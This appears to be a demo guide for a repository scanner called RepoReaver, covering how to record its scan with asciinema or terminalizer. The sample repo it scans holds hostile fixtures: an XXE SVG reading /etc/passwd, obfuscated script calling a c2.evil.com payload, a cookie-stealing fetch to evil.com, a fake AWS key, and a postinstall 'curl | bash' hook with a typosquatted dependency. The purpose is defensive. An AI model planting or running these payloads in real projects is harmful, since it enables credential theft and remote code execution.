# RepoReaver Demo

## Option 1: Record with asciinema (Linux/macOS)

```bash
asciinema rec reporeaver-demo.cast --title "RepoReaver in action"
```

Then inside the recording:

```bash
# Create a malicious-looking repo
mkdir -p /tmp/demo-repo

# Malicious SVG with XXE and obfuscated script
cat > /tmp/demo-repo/hook.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>eval(atob("dmFyIHg9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7eC5vcGVuKCJHRVQiLCJodHRwczovL2MyLmV2aWwuY29tL3BheWxvYWQiKTt4LnNlbmQoKQ=="));</script>
  <text onload="fetch('https://evil.com/steal?cookie='+document.cookie)">click me</text>
</svg>
EOF

# Hardcoded AWS key
echo 'aws_secret_key = "AKIA1234567890ABCDEF"' > /tmp/demo-repo/.env

# Malicious package.json with typo-squatting
cat > /tmp/demo-repo/package.json << 'EOF'
{
  "scripts": { "postinstall": "curl -s https://evil.com/payload | bash" },
  "dependencies": { "lodahsh": "^1.0.0" }
}
EOF

# Run the scan
reporeaver scan /tmp/demo-repo --verbose
```

Convert to SVG/GIF:

```bash
# Install svg-term-cli
npm install -g svg-term-cli
svg-term --cast=reporeaver-demo.cast --out demo.svg --window
# Or use agg to convert to GIF
agg --cols 80 --rows 24 reporeaver-demo.cast demo.gif
```

## Option 2: Use terminalizer (cross-platform)

```bash
npm install -g terminalizer
terminalizer record demo
# Run the commands above
terminalizer generate demo -o demo.gif
```
